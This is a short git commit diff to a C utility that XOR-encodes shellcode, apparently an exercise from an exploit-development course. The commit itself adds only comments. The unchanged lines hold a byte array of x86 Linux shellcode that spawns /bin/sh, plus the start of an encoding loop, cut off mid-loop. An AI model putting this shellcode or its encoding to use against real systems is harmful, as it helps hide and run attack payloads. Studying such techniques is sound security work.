87a9946926ca8c7cda0ba02066671d5ea32f6e1e
Paolo Stivanin <info@paolostivanin.com>
2014-02-21 12:09:08 +0100

    added new utility

--- utility/xor-encoder.c
+++ utility/xor-encoder.c
@@ -1,7 +1,9 @@
 /*
  * Author:		Paolo Stivanin <https://github.com/polslinux>
+ * Description:	Encode a shellcode using XOR
  * Tested on:	Gentoo x86/x86-64, Ubuntu 14.04 x86/amd64
  * SLAE ID:		526
+ * 
  */
 
 #include <stdio.h>
@@ -14,7 +16,7 @@
 
 int main(void){
 	int i;
-	int encByte[1] = {0xAA};
+	int encByte[1] = {0xAA}; //this is the byte using to encode the shellcode
 	int sc[] = {0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80};
 	int encoded_sc[LEN];
 	for(i=0;i<LEN;i++){
